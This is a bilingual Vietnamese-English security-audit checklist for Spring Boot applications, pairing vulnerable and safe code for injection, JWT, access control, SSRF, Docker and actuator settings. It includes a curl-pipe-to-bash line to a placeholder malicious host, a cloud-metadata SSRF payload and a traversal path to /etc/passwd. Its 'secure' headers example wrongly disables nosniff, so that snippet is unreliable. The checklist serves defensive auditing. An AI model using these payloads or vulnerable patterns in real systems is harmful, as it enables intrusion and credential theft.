# CHECKLIST ACCEPTANCE CRITERIA - JAVA SPRING BOOT SECURITY AUDIT

## 1. Tổng quan (Overview)

### 1.1. Mục tiêu
- [ ] Kiểm tra toàn bộ codebase theo zero-trust mindset
- [ ] Phát hiện lỗ hổng bảo mật trong authentication, authorization, data access
- [ ] Đảm bảo không có secrets bị hardcode hoặc leak trong version control
- [ ] Kiểm tra supply chain security (dependencies, build process)
- [ ] Đưa ra remediation plan cụ thể cho từng finding

### 1.2. Phạm vi kiểm tra
```
Source Code (*.java)
    ↓
Configuration Files (application.yml, application.properties, pom.xml)
    ↓
Dependencies (Maven/Gradle)
    ↓
Security Configuration (SecurityConfig, JWT, Filters)
    ↓
Database Access (Repositories, Queries)
    ↓
API Endpoints (Controllers, DTOs)
    ↓
Build & Deployment (Dockerfile, CI/CD)
```

---

## 2. Dependencies & Supply Chain Security

### 2.1. Dependency Manifest Review (pom.xml / build.gradle)
- [ ] Tất cả dependencies có `groupId`, `artifactId`, `version` rõ ràng
- [ ] Không sử dụng version wildcards (`LATEST`, `RELEASE`, `+`, version ranges)
- [ ] Không có direct JAR downloads qua `<systemPath>` hoặc `files()`
- [ ] Không có repositories không rõ nguồn gốc (chỉ Maven Central, Spring Repos)
- [ ] Không có typosquatting packages (ví dụ: `com.fasterxml.jackson` → sai thành `com.faster.xml`)

### 2.2. Known Vulnerable Dependencies
- [ ] **Spring Boot**: Version >= 3.2.x (tránh Log4Shell, Spring4Shell)
- [ ] **Log4j**: Version >= 2.17.1 (CVE-2021-44228 - Log4Shell)
- [ ] **Jackson-databind**: Version >= 2.16.0 (tránh deserialization CVEs)
- [ ] **MySQL Connector/J**: Version >= 8.0.33 (tránh SQL injection vulnerabilities)
- [ ] **Spring Security**: Version >= 6.2.x (tránh authorization bypass bugs)

### 2.3. Suspicious Build Plugins
- [ ] Không có `exec-maven-plugin` thực thi shell commands nguy hiểm
- [ ] Không có plugins download external scripts (`curl | bash`)
- [ ] Tất cả plugins đều pin version (không dùng `LATEST`)
- [ ] Plugins chỉ từ Maven Central hoặc trusted repositories

### 2.4. Transitive Dependencies Audit
```bash
# Command để review (manual check)
mvn dependency:tree -Dverbose
gradle dependencies --configuration runtimeClasspath
```
- [ ] Review toàn bộ transitive dependencies cho critical libraries
- [ ] Check version conflicts → ưu tiên version cao hơn nếu có security patches
- [ ] Verify test-scoped dependencies không leak vào runtime

---

## 3. Secrets & Credential Management

### 3.1. Configuration Files Scan (application.yml, application.properties)
- [ ] **Database Password**: Sử dụng `${DB_PASSWORD}` thay vì hardcoded
- [ ] **JWT Secret**: Sử dụng `${JWT_SECRET}` thay vì hardcoded
- [ ] **API Keys**: Sử dụng environment variables cho tất cả external API keys
- [ ] **SMTP Credentials**: Không hardcode username/password
- [ ] **Cloud Credentials**: AWS/GCP/Azure credentials phải dùng IAM roles hoặc env vars

### 3.2. MySQL Connection String Security
```properties
# ❌ INSECURE
spring.datasource.url=jdbc:mysql://localhost:3306/db?useSSL=false&allowPublicKeyRetrieval=true
spring.datasource.password=root123

# ✅ SECURE
spring.datasource.url=jdbc:mysql://localhost:3306/db?useSSL=true&requireSSL=true&verifyServerCertificate=true
spring.datasource.password=${DB_PASSWORD}
```
- [ ] `useSSL=true` và `requireSSL=true` phải được bật
- [ ] `verifyServerCertificate=true` để tránh MITM attacks
- [ ] `allowLoadLocalInfile=false` (ngăn local file read attacks)
- [ ] `allowPublicKeyRetrieval=false` (trừ khi SSL enabled)

### 3.3. Git History Secret Leak Check
```bash
# Commands để scan (manual verification)
git log -p | grep -Ei "password|secret|key" | head -50
git log -p -- '*.properties' '*.yml' | grep -i password
```
- [ ] Scan git history cho leaked secrets
- [ ] Nếu phát hiện secrets trong history → rotate credentials ngay lập tức
- [ ] Sử dụng tools: `truffleHog`, `gitleaks`, `git-secrets`

### 3.4. Code-Level Hardcoded Secrets
```java
// ❌ VULNERABLE PATTERNS
private static final String PASSWORD = "MyP@ssw0rd";
String apiKey = "sk-1234567890abcdef";
signWith(SignatureAlgorithm.HS256, "mySecretKey");

// ✅ SAFE PATTERNS
@Value("${db.password}")
private String password;

@Value("${jwt.secret}")
private String jwtSecret;
```
- [ ] Scan tất cả `private static final String` constants cho keywords: `password`, `secret`, `key`, `token`
- [ ] Verify `@Value` annotations sử dụng `${...}` placeholders
- [ ] Check constructors/methods không nhận hardcoded credentials

---

## 4. SQL Injection Vulnerabilities

### 4.1. Native Query String Concatenation
```java
// ❌ CRITICAL VULNERABILITY
@Query(value = "SELECT * FROM users WHERE username = '" + username + "'", nativeQuery = true)

@Query(value = "SELECT * FROM " + tableName + " WHERE id = " + id, nativeQuery = true)

String sql = "SELECT * FROM users WHERE email = '" + email + "'";
entityManager.createNativeQuery(sql);

// ✅ SAFE - PARAMETERIZED QUERIES
@Query(value = "SELECT * FROM users WHERE username = :username", nativeQuery = true)
User findByUsername(@Param("username") String username);

@Query(value = "SELECT * FROM users WHERE id = :id", nativeQuery = true)
User findById(@Param("id") Long id);
```
- [ ] **ZERO tolerance** cho string concatenation trong `@Query` annotations
- [ ] Tất cả native queries phải dùng `:paramName` hoặc `?1` placeholders
- [ ] Dynamic table/column names → whitelist validation + parameterized queries

### 4.2. JPA/JPQL Query Injection
```java
// ❌ VULNERABLE
Query query = em.createQuery("FROM User WHERE username = '" + input + "'");

// ✅ SAFE
Query query = em.createQuery("FROM User WHERE username = :user");
query.setParameter("user", input);
```
- [ ] JPQL queries không được concatenate user input
- [ ] Sử dụng named parameters (`:name`) hoặc positional (`?1`)

### 4.3. JdbcTemplate Usage
```java
// ❌ VULNERABLE
jdbcTemplate.query("SELECT * FROM orders WHERE user_id = " + userId, rowMapper);

// ✅ SAFE
jdbcTemplate.query("SELECT * FROM orders WHERE user_id = ?", rowMapper, userId);
```
- [ ] JdbcTemplate queries phải dùng `?` placeholders
- [ ] Không concatenate SQL strings với user input

### 4.4. Criteria API Safety
- [ ] Dynamic predicates không concatenate strings
- [ ] Sử dụng `CriteriaBuilder` methods correctly
- [ ] Type-safe queries với Metamodel classes

---

## 5. JWT Security

### 5.1. Secret Key Strength & Storage
```java
// ❌ WEAK SECRETS
.setSigningKey("secret")
.setSigningKey("myJwtSecret123")
.signWith(SignatureAlgorithm.HS256, "test")

// ✅ STRONG SECRETS
@Value("${jwt.secret}")
private String jwtSecret; // Must be 256-bit random value

.setSigningKey(jwtSecret.getBytes())
```
- [ ] JWT secret **tối thiểu 32 characters** (256 bits) cho HS256
- [ ] Secret phải random (không phải từ điển, không phải patterns)
- [ ] Secret lưu trong environment variable: `${JWT_SECRET}`
- [ ] **Hoặc** sử dụng RS256/RS512 với public/private keypair

### 5.2. Algorithm Confusion Prevention
```java
// ❌ VULNERABLE - Accepts "none" algorithm
Jwts.parser()
    .setAllowedClockSkewSeconds(300)
    .parseClaimsJws(token); // Missing setSigningKey!

// ✅ SAFE - Algorithm whitelist
Jwts.parser()
    .setSigningKey(secret.getBytes())
    .parseClaimsJws(token);
```
- [ ] **LUÔN** gọi `setSigningKey()` TRƯỚC `parseClaimsJws()`
- [ ] Whitelist algorithms: chỉ cho phép HS256/HS512 hoặc RS256/RS512
- [ ] Từ chối tokens với `alg: none`

### 5.3. Claims Validation
```java
// ✅ COMPLETE VALIDATION
Claims claims = Jwts.parser()
    .setSigningKey(secret)
    .requireIssuer("your-app")           // Validate issuer
    .requireAudience("your-audience")     // Validate audience
    .parseClaimsJws(token)
    .getBody();

// Check expiration
if (claims.getExpiration().before(new Date())) {
    throw new ExpiredJwtException(null, claims, "Token expired");
}
```
- [ ] Validate `iss` (issuer) claim
- [ ] Validate `aud` (audience) claim
- [ ] Validate `exp` (expiration) - MANDATORY
- [ ] Validate `nbf` (not before) nếu có
- [ ] Validate `iat` (issued at) để detect replay attacks

### 5.4. Token Lifecycle Management
- [ ] Token expiration time: **≤ 1 hour** cho access tokens
- [ ] Refresh token expiration: **≤ 7 days**
- [ ] Implement token blacklist/revocation mechanism (Redis)
- [ ] Không reuse tokens sau logout
- [ ] Rotate refresh tokens on each use

### 5.5. Token Storage & Transmission
```java
// ❌ INSECURE - Token in URL
@GetMapping("/data?token={token}")

// ❌ INSECURE - Token in localStorage (XSS risk)
// Frontend: localStorage.setItem('token', token)

// ✅ SECURE - HttpOnly Cookie hoặc Authorization header
@GetMapping("/data")
public Response getData(@RequestHeader("Authorization") String authHeader)
```
- [ ] Tokens **KHÔNG ĐƯỢC** truyền qua URL query parameters
- [ ] Sử dụng `Authorization: Bearer {token}` header
- [ ] **HOẶC** HttpOnly, Secure cookies với SameSite=Strict
- [ ] Frontend tránh localStorage (dùng sessionStorage hoặc memory)

---

## 6. Authorization & Access Control

### 6.1. Method Security Configuration
```java
// ✅ REQUIRED
@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {
    // ...
}
```
- [ ] `@EnableMethodSecurity(prePostEnabled = true)` được bật
- [ ] Tất cả sensitive endpoints có `@PreAuthorize` hoặc `@Secured`

### 6.2. Missing Authorization Checks (CRITICAL)
```java
// ❌ NO AUTHORIZATION
@GetMapping("/api/admin/users")
public List<User> getAllUsers() {
    return userRepository.findAll(); // Anyone can access!
}

// ✅ WITH AUTHORIZATION
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/api/admin/users")
public List<User> getAllUsers() {
    return userRepository.findAll();
}
```
- [ ] **Tất cả** endpoints trong `/api/admin/**` phải có `@PreAuthorize("hasRole('ADMIN')")`
- [ ] **Tất cả** endpoints nhạy cảm phải có authorization checks
- [ ] Không dựa vào frontend để enforce authorization

### 6.3. IDOR (Insecure Direct Object References)
```java
// ❌ IDOR VULNERABILITY
@GetMapping("/api/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
    // User A có thể xem data của User B bằng cách đổi ID!
}

// ✅ FIXED - Ownership Check
@GetMapping("/api/users/{id}")
public User getUser(@PathVariable Long id, Authentication auth) {
    Long currentUserId = ((UserPrincipal) auth.getPrincipal()).getId();
    return userRepository.findByIdAndUserId(id, currentUserId)
        .orElseThrow(() -> new AccessDeniedException("Not your resource"));
}

// ✅ ALTERNATIVE - SpEL Expression
@PreAuthorize("@userSecurity.isOwner(#id)")
@GetMapping("/api/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
}
```
- [ ] **Tất cả** methods fetch by ID phải verify ownership
- [ ] User chỉ được phép access resources của chính họ
- [ ] Implement custom security evaluators (`@userSecurity.isOwner()`)

### 6.4. Spring Security Configuration Review
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/public/**").permitAll()
            .requestMatchers("/api/admin/**").hasRole("ADMIN")  // ✅ Explicit
            .requestMatchers("/api/user/**").authenticated()
            .anyRequest().authenticated()  // ✅ Deny by default
        )
        .csrf(csrf -> csrf.disable()) // Only if truly stateless API
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        );
    return http.build();
}
```
- [ ] **Deny by default**: `.anyRequest().authenticated()`
- [ ] `permitAll()` chỉ cho public endpoints (`/api/public/**`, `/actuator/health`)
- [ ] CSRF enabled NẾU dùng session-based auth (disabled nếu JWT stateless)
- [ ] Session management: `STATELESS` cho JWT-based APIs

---

## 7. Deserialization Vulnerabilities

### 7.1. Jackson Configuration Safety
```java
// ❌ CRITICAL VULNERABILITY - RCE Risk
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();  // NEVER DO THIS!
    return mapper;
}

// ❌ DANGEROUS @JsonTypeInfo
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  // Allows arbitrary classes
public abstract class BaseClass { }

// ✅ SAFE - Explicit Subtypes
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal { }
```
- [ ] **ZERO tolerance** cho `enableDefaultTyping()`
- [ ] `@JsonTypeInfo` phải dùng `Id.NAME` với explicit `@JsonSubTypes`
- [ ] **KHÔNG DÙNG** `Id.CLASS` - cho phép instantiate arbitrary classes

### 7.2. Java Native Serialization
```java
// ❌ AVOID Java Serialization
ObjectInputStream ois = new ObjectInputStream(inputStream);
MyObject obj = (MyObject) ois.readObject(); // Deserialization attack!

// ✅ PREFER JSON
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(jsonString, MyObject.class);
```
- [ ] Tránh `ObjectInputStream.readObject()` trên untrusted data
- [ ] Prefer JSON serialization over Java serialization
- [ ] Nếu bắt buộc dùng: implement custom `readObject()` với validation

### 7.3. YAML Deserialization
```java
// ❌ UNSAFE
Yaml yaml = new Yaml();
Object obj = yaml.load(untrustedInput); // Can execute code!

// ✅ SAFE
Yaml yaml = new Yaml(new SafeConstructor());
MyObject obj = yaml.loadAs(input, MyObject.class);
```
- [ ] Sử dụng `SafeConstructor` cho YAML parsing
- [ ] Specify target class với `loadAs(input, Class)`

---

## 8. Input Validation & Mass Assignment

### 8.1. DTO vs Entity Binding
```java
// ❌ MASS ASSIGNMENT VULNERABILITY
@PostMapping("/users")
public User createUser(@RequestBody User user) {  
    // Attacker can set: user.setRole("ADMIN")!
    return userRepository.save(user);
}

// ✅ SAFE - Use DTO
@PostMapping("/users")
public User createUser(@Valid @RequestBody CreateUserRequest dto) {
    User user = new User();
    user.setUsername(dto.getUsername());
    user.setEmail(dto.getEmail());
    user.setRole("USER"); // Set securely, not from input
    return userRepository.save(user);
}
```
- [ ] **KHÔNG BAO GIỜ** bind `@RequestBody` trực tiếp vào `@Entity`
- [ ] Luôn sử dụng DTOs (Data Transfer Objects)
- [ ] Sensitive fields (role, isAdmin, isActive) **KHÔNG được** có trong DTOs

### 8.2. Bean Validation
```java
// ❌ MISSING VALIDATION
public class CreateUserRequest {
    private String email;
    private String password;
    private Integer age;
}

// ✅ WITH VALIDATION
public class CreateUserRequest {
    @NotBlank(message = "Email is required")
    @Email(message = "Invalid email format")
    private String email;

    @NotBlank(message = "Password is required")
    @Size(min = 8, max = 100, message = "Password must be 8-100 characters")
    @Pattern(regexp = "^(?=.*[A-Z])(?=.*[a-z])(?=.*\\d).*$", 
             message = "Password must contain uppercase, lowercase, and digit")
    private String password;

    @NotNull
    @Min(value = 18, message = "Must be 18 or older")
    @Max(value = 120, message = "Invalid age")
    private Integer age;
}
```
- [ ] Tất cả DTO fields có validation constraints
- [ ] `@Valid` annotation trên `@RequestBody` parameters
- [ ] Email validation: `@Email`
- [ ] String length: `@Size(min, max)`
- [ ] Regex patterns: `@Pattern` cho formats (phone, postal code, etc.)
- [ ] Numeric ranges: `@Min`, `@Max`

### 8.3. Sensitive Field Protection
```java
public class UserDTO {
    private String username;
    private String email;
    
    @JsonProperty(access = JsonProperty.Access.READ_ONLY)
    private String role; // Can't be set via JSON input
    
    @JsonIgnore
    private String password; // Never serialize
}
```
- [ ] `@JsonProperty(access = READ_ONLY)` cho sensitive fields
- [ ] `@JsonIgnore` cho passwords trong response DTOs

---

## 9. Path Traversal & SSRF

### 9.1. File Path Validation
```java
// ❌ PATH TRAVERSAL VULNERABILITY
@GetMapping("/files/{filename}")
public Resource download(@PathVariable String filename) {
    return new FileSystemResource("/uploads/" + filename);
    // Attack: /files/../../etc/passwd
}

// ✅ SAFE - Sanitization & Validation
@GetMapping("/files/{filename}")
public Resource download(@PathVariable String filename) {
    // 1. Reject path traversal characters
    if (filename.contains("..") || filename.contains("/") || filename.contains("\\")) {
        throw new IllegalArgumentException("Invalid filename");
    }
    
    // 2. Resolve and normalize path
    Path basePath = Paths.get("/uploads").toAbsolutePath().normalize();
    Path filePath = basePath.resolve(filename).normalize();
    
    // 3. Verify file is within base directory
    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Access denied");
    }
    
    // 4. Verify file exists and is not directory
    if (!Files.exists(filePath) || Files.isDirectory(filePath)) {
        throw new FileNotFoundException();
    }
    
    return new FileSystemResource(filePath);
}
```
- [ ] Validate filenames: không chứa `..`, `/`, `\`
- [ ] Normalize paths: `Path.normalize()`
- [ ] Verify boundaries: `filePath.startsWith(basePath)`
- [ ] Check file exists và không phải directory

### 9.2. SSRF (Server-Side Request Forgery)
```java
// ❌ SSRF VULNERABILITY
@PostMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);
    // Attack: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
}

// ✅ SAFE - URL Whitelist
@PostMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    // 1. Parse URL
    URI uri;
    try {
        uri = new URI(url);
    } catch (URISyntaxException e) {
        throw new IllegalArgumentException("Invalid URL");
    }
    
    // 2. Whitelist allowed domains
    List<String> allowedHosts = Arrays.asList("api.trusted.com", "cdn.trusted.com");
    if (!allowedHosts.contains(uri.getHost())) {
        throw new SecurityException("Host not allowed");
    }
    
    // 3. Block private IP ranges
    String host = uri.getHost();
    if (host.startsWith("127.") || host.startsWith("10.") || 
        host.startsWith("172.16.") || host.startsWith("192.168.") ||
        host.equals("localhost") || host.startsWith("169.254.")) {
        throw new SecurityException("Private IP access denied");
    }
    
    // 4. Use HttpClient with timeout
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(uri, String.class);
}
```
- [ ] Whitelist allowed domains/hosts
- [ ] Block private IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- [ ] Block localhost (127.0.0.1, ::1)
- [ ] Block link-local (169.254.0.0/16)
- [ ] Block cloud metadata endpoints (169.254.169.254)
- [ ] Set connection timeout (≤ 10 seconds)

---

## 10. Logging & Information Disclosure

### 10.1. Sensitive Data in Logs
```java
// ❌ LOGGING SENSITIVE DATA
logger.info("User login: {}", userRequest);  // Contains password!
logger.debug("SQL: {}", query);  // Exposes data
logger.error("Error", e);  // Stack trace may contain secrets
System.out.println("Token: " + jwtToken);  // Never do this

// ✅ SAFE LOGGING
logger.info("User login attempt: username={}", userRequest.getUsername());
logger.debug("Query executed on table: {}", tableName);
logger.error("Authentication failed for user: {}", username); // No stack trace in prod
```
- [ ] **KHÔNG BAO GIỜ** log: passwords, tokens, API keys, credit cards, SSN
- [ ] **KHÔNG** log full request/response objects (có thể chứa secrets)
- [ ] **KHÔNG** log SQL queries với bound parameters (data leakage)
- [ ] Sử dụng parameterized logging: `logger.info("...", param)` thay vì concatenation

### 10.2. Log Injection Prevention
```java
// ❌ LOG INJECTION VULNERABILITY
logger.info("Login failed for user: " + username);
// Attack: username = "admin\nLEVEL=ERROR Fake error message"

// ✅ SAFE - Parameterized Logging
logger.info("Login failed for user: {}", username);
```
- [ ] Luôn dùng parameterized logging (`{}` placeholders)
- [ ] Không concatenate user input vào log messages

### 10.3. Exception Handling
```java
// ❌ INFORMATION DISCLOSURE
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleException(Exception e) {
    return ResponseEntity.status(500).body(e.getMessage() + "\n" + e.getStackTrace());
    // Exposes internal paths, library versions, database info
}

// ✅ SAFE - Generic Error Messages
@ExceptionHandler(Exception.class)
public ResponseEntity<ErrorResponse> handleException(Exception e) {
    logger.error("Internal error", e); // Log details internally
    return ResponseEntity.status(500).body(
        new ErrorResponse(500, "Internal Server Error")
    ); // Generic message to client
}
```
- [ ] **KHÔNG BAO GIỜ** expose stack traces trong API responses
- [ ] Generic error messages cho clients
- [ ] Chi tiết errors chỉ trong server logs (với proper access control)

### 10.4. Debug Mode in Production
```yaml
# ❌ application-prod.yml
debug: true
logging:
  level:
    root: DEBUG
spring:
  jpa:
    show-sql: true

# ✅ application-prod.yml
debug: false
logging:
  level:
    root: WARN
    com.yourcompany: INFO
spring:
  jpa:
    show-sql: false
```
- [ ] `debug: false` trong production profiles
- [ ] Log level: `WARN` hoặc `INFO` (không `DEBUG`/`TRACE`)
- [ ] `spring.jpa.show-sql: false` để tránh log SQL queries

---

## 11. CORS & Security Headers

### 11.1. CORS Configuration
```java
// ❌ OVERLY PERMISSIVE
@CrossOrigin(origins = "*", allowCredentials = "true")
// This configuration is REJECTED by browsers!

@CrossOrigin(origins = "*")
@GetMapping("/api/sensitive-data")
// Allows any origin to call this endpoint

// ✅ RESTRICTIVE CORS
@CrossOrigin(
    origins = "https://trusted-domain.com",
    methods = {RequestMethod.GET, RequestMethod.POST},
    allowCredentials = "true",
    maxAge = 3600
)
@GetMapping("/api/user-data")
```
- [ ] **KHÔNG DÙNG** `origins = "*"` với `allowCredentials = true` (browsers reject)
- [ ] Whitelist specific domains: `origins = "https://yourdomain.com"`
- [ ] Limit methods: chỉ allow methods cần thiết
- [ ] Sensitive endpoints **KHÔNG NÊN** có permissive CORS

### 11.2. Security Headers
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none';")
            )
            .frameOptions(frame -> frame.deny())
            .xssProtection(xss -> xss.block(true))
            .contentTypeOptions(contentType -> contentType.disable())
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)
            )
        );
    return http.build();
}
```
- [ ] `Content-Security-Policy`: `default-src 'self'`
- [ ] `X-Frame-Options`: `DENY` (ngăn clickjacking)
- [ ] `X-Content-Type-Options`: `nosniff`
- [ ] `Strict-Transport-Security`: `max-age=31536000; includeSubDomains`
- [ ] `X-XSS-Protection`: `1; mode=block` (legacy nhưng vẫn hữu ích)

---

## 12. Database Security

### 12.1. Connection Pool Configuration
```properties
# HikariCP Configuration
spring.datasource.hikari.maximum-pool-size=10
spring.datasource.hikari.minimum-idle=5
spring.datasource.hikari.connection-timeout=30000
spring.datasource.hikari.idle-timeout=600000
spring.datasource.hikari.max-lifetime=1800000
spring.datasource.hikari.leak-detection-threshold=60000
```
- [ ] Limit pool size: `maximum-pool-size` ≤ 20 (tránh resource exhaustion)
- [ ] Connection timeout: ≤ 30 seconds
- [ ] Enable leak detection: `leak-detection-threshold=60000`

### 12.2. Database User Privileges
```sql
-- ❌ EXCESSIVE PRIVILEGES
GRANT ALL PRIVILEGES ON *.* TO 'app_user'@'%';

-- ✅ MINIMAL PRIVILEGES
CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'%';
FLUSH PRIVILEGES;
```
- [ ] Application **KHÔNG DÙNG** `root` user
- [ ] Chỉ grant: `SELECT`, `INSERT`, `UPDATE`, `DELETE`
- [ ] **KHÔNG GRANT**: `FILE`, `SUPER`, `PROCESS`, `RELOAD`, `SHUTDOWN`
- [ ] Limit user to specific database (`app_db.*` thay vì `*.*`)

### 12.3. SQL Injection Prevention Review
- [ ] 100% queries dùng parameterized queries
- [ ] **ZERO** string concatenation trong SQL
- [ ] Review tất cả `@Query(nativeQuery = true)` annotations
- [ ] Review tất cả `createNativeQuery()` calls
- [ ] Review tất cả JdbcTemplate queries

---

## 13. Dockerfile & Deployment Security

### 13.1. Dockerfile Review
```dockerfile
# ❌ INSECURE
FROM openjdk:latest
ENV DB_PASSWORD=root123
RUN curl https://malicious.com/script.sh | bash
EXPOSE 8080
CMD ["java", "-jar", "app.jar"]

# ✅ SECURE
FROM eclipse-temurin:17-jre-alpine
# Use non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
WORKDIR /app
COPY --chown=appuser:appgroup target/app.jar app.jar
EXPOSE 8080
HEALTHCHECK --interval=30s --timeout=3s CMD wget --quiet --tries=1 --spider http://localhost:8080/actuator/health || exit 1
CMD ["java", "-XX:+UseContainerSupport", "-XX:MaxRAMPercentage=75.0", "-jar", "app.jar"]
```
- [ ] **Pin base image version**: `eclipse-temurin:17-jre-alpine` (không dùng `latest`)
- [ ] **Use non-root user**: `USER appuser`
- [ ] **No secrets in ENV/ARG**: Dùng secrets management (Docker secrets, K8s secrets)
- [ ] **No curl | bash**: Không download và execute external scripts
- [ ] **Use alpine**: Base image nhỏ → ít attack surface
- [ ] **Multi-stage builds**: Giảm size và loại bỏ build tools khỏi final image

### 13.2. .dockerignore
```
# .dockerignore
.git
.env
*.log
target/
*.iml
.idea/
```
- [ ] Exclude `.env` files (chứa secrets)
- [ ] Exclude `.git` directory
- [ ] Exclude build artifacts không cần thiết

---

## 14. Spring Boot Actuator Security

### 14.1. Actuator Endpoints
```yaml
# ❌ INSECURE - All endpoints exposed
management:
  endpoints:
    web:
      exposure:
        include: "*"

# ✅ SECURE - Limited exposure
management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics
  endpoint:
    health:
      show-details: when-authorized
```
- [ ] **KHÔNG EXPOSE** sensitive endpoints: `/actuator/env`, `/actuator/heapdump`, `/actuator/threaddump`
- [ ] Chỉ expose: `health`, `info`, `metrics` (nếu cần)
- [ ] Require authentication cho tất cả actuator endpoints:
```java
.requestMatchers("/actuator/**").hasRole("ADMIN")
```

### 14.2. Environment Endpoint Protection
- [ ] `/actuator/env` exposes environment variables → **DISABLE** hoặc require ADMIN role
- [ ] `/actuator/configprops` exposes configuration → **DISABLE** hoặc require ADMIN role

---

## 15. Testing Requirements

### 15.1. Security Unit Tests
- [ ] **SQL Injection Tests**: Verify parameterized queries reject malicious input
- [ ] **JWT Tests**: Test algorithm confusion, expired tokens, tampered tokens
- [ ] **Authorization Tests**: Test IDOR, missing `@PreAuthorize`, role escalation
- [ ] **Input Validation Tests**: Test DTO validation constraints
- [ ] **Deserialization Tests**: Test Jackson rejects malicious payloads

### 15.2. Integration Tests
- [ ] **Authentication Flow**: Token generation, validation, refresh
- [ ] **Authorization Flow**: Role-based access, permission checks
- [ ] **Error Handling**: 401/403 responses, exception handling

### 15.3. Penetration Testing Checklist
- [ ] Run OWASP ZAP scan against running application
- [ ] Test for SQL injection in all input fields
- [ ] Test for IDOR by changing IDs in URLs
- [ ] Test CORS policies with different origins
- [ ] Test JWT tampering (change payload, signature, algorithm)
- [ ] Test path traversal in file download/upload endpoints

---

## 16. Automated Security Scanning

### 16.1. Dependency Scanning
```bash
# Maven
mvn org.owasp:dependency-check-maven:check

# Gradle
./gradlew dependencyCheckAnalyze
```
- [ ] Run OWASP Dependency Check trong CI/CD pipeline
- [ ] Fail build nếu có CRITICAL/HIGH vulnerabilities
- [ ] Update dependencies quarterly

### 16.2. Static Analysis (SAST)
```bash
# SpotBugs with FindSecBugs
mvn spotbugs:check

# SonarQube
mvn sonar:sonar
```
- [ ] Enable SpotBugs với FindSecBugs plugin
- [ ] Integrate SonarQube for code quality + security
- [ ] Set quality gates: zero critical bugs

### 16.3. Secret Scanning
```bash
# TruffleHog
docker run -v "$PWD:/path" trufflesecurity/trufflehog:latest filesystem /path

# Gitleaks
gitleaks detect --source . -v

# git-secrets
git secrets --scan
```
- [ ] Scan codebase for leaked secrets
- [ ] Scan git history
- [ ] Add pre-commit hooks để prevent secret commits

---

## 17. Remediation Priority Matrix

### 17.1. CRITICAL (P0) - Fix Immediately
- [ ] Hardcoded database passwords trong config files
- [ ] SQL injection vulnerabilities
- [ ] JWT với weak secrets hoặc algorithm confusion
- [ ] `enableDefaultTyping()` trong Jackson
- [ ] Missing authorization on admin endpoints
- [ ] Secrets leaked trong git history

### 17.2. HIGH (P1) - Fix This Sprint
- [ ] IDOR vulnerabilities
- [ ] Mass assignment vulnerabilities
- [ ] Path traversal vulnerabilities
- [ ] SSRF vulnerabilities
- [ ] Outdated dependencies với known CVEs
- [ ] Missing input validation
- [ ] Excessive logging of sensitive data

### 17.3. MEDIUM (P2) - Fix Next Sprint
- [ ] Missing CORS restrictions
- [ ] Missing security headers
- [ ] Weak password policies
- [ ] Missing rate limiting
- [ ] Actuator endpoints exposed without auth
- [ ] Debug mode enabled in production

### 17.4. LOW (P3) - Backlog
- [ ] Code quality issues
- [ ] Missing Javadoc
- [ ] Non-critical dependency updates
- [ ] Performance optimizations

---

## 18. Compliance Checklist

### 18.1. OWASP Top 10 Coverage
- [ ] **A01:2021 – Broken Access Control**: Authorization checks, IDOR prevention
- [ ] **A02:2021 – Cryptographic Failures**: JWT secrets, password hashing, SSL/TLS
- [ ] **A03:2021 – Injection**: SQL injection prevention
- [ ] **A04:2021 – Insecure Design**: Security by design principles
- [ ] **A05:2021 – Security Misconfiguration**: Secure defaults, actuator security
- [ ] **A06:2021 – Vulnerable Components**: Dependency scanning
- [ ] **A07:2021 – Authentication Failures**: JWT implementation, session management
- [ ] **A08:2021 – Software and Data Integrity**: Code signing, CI/CD security
- [ ] **A09:2021 – Logging Failures**: Secure logging, no sensitive data
- [ ] **A10:2021 – SSRF**: URL validation, whitelist

---

## 19. Documentation Requirements

### 19.1. Security Architecture Document
- [ ] Authentication flow diagram
- [ ] Authorization model (RBAC, permissions)
- [ ] Database access patterns
- [ ] External service integrations
- [ ] Threat model

### 19.2. Developer Security Guide
- [ ] How to add new endpoints securely
- [ ] How to write secure queries
- [ ] How to handle sensitive data
- [ ] How to test security features
- [ ] Common pitfalls và how to avoid

### 19.3. Operations Security Guide
- [ ] How to rotate secrets
- [ ] How to respond to security incidents
- [ ] How to monitor security metrics
- [ ] How to perform security audits

---

## 20. Definition of Done

### 20.1. Code Review Checklist
- [ ] All CRITICAL findings fixed
- [ ] All HIGH findings fixed hoặc có mitigation plan
- [ ] Security tests passing
- [ ] SAST tools passing (SpotBugs, SonarQube)
- [ ] Dependency scan clean (no CRITICAL/HIGH vulns)
- [ ] Secret scan clean
- [ ] Code review approved by security champion

